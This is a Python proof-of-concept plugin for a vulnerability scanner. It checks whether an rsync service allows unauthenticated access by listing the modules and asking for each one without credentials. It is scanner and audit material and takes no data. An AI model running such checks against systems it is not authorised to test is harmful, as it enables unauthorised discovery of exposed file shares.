#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import asyncio
from lib.utils.connect import open_connection
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.RSYNC
        self.name = 'rsync unauth'
        self.keyword = ['rsync', 'unauth']
        self.info = 'rsync unauth'
        self.type = 'unauth'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        reader, writer = await open_connection(self.target_host, self.target_port)
        message = '@RSYNCD: 30.0\r\n'
        writer.write(message.encode())

        data = await reader.read(1024)
        if '@RSYNCD' in str(data):
            data = (data).decode('utf-8')
            message = '\r\n'
            writer.write(message.encode())
            await asyncio.sleep(0.5)
            data = (await reader.read(1024)).decode('utf-8')
            writer.close()
            for line in data.split('\n'):
                if not line or line.startswith("@RSYNCD"):
                    continue
                elif '@RSYNCD' not in line and ' ' in line:
                    line = line[:line.index(" ")]
                reader1, writer1 = await open_connection(self.target_host, self.target_port)
                message1 = '@RSYNCD: 30.0\r\n'
                writer1.write(message1.encode())
                data1 = (await reader1.read(1024)).decode('utf-8')
                message1 = '{}\r\n'.format(line)
                writer1.write(message1.encode())
                res = (await reader1.read(1024)).decode('utf-8')
                writer1.close()
                if '@RSYNCD: OK' in res:
                    self.flag = 1
                    self.res.append({"info": line, "key": "rsync unauth", "rsync_info": data})

